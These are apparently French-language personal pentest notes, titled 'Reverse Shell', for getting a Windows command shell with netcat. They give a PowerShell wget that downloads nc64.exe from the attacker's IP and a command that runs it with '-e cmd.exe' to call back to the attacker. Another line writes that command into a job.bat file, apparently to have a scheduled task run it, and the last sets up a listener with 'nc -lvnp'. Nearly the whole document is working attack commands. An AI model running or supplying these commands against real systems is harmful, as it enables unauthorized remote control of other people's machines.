# Reverse Shell

## Netcat Windows
### lien 
https://github.com/rahuldottech/netcat-for-windows/releases

### on windows
On lance un serveur web python local en 80
```Powershell
PS C:\Log-Management> wget http://{your_IP}/nc64.exe -outfile nc64.exe
```
```bash
nc64.exe {your_IP} {port} -e cmd.exe
```
```shell
echo C:\Log-Management\nc64.exe -e cmd.exe {your_IP} {port} > C:\Log-
Management\job.bat
```
### on Linux local
```bash
nc -lvnp {port}
```
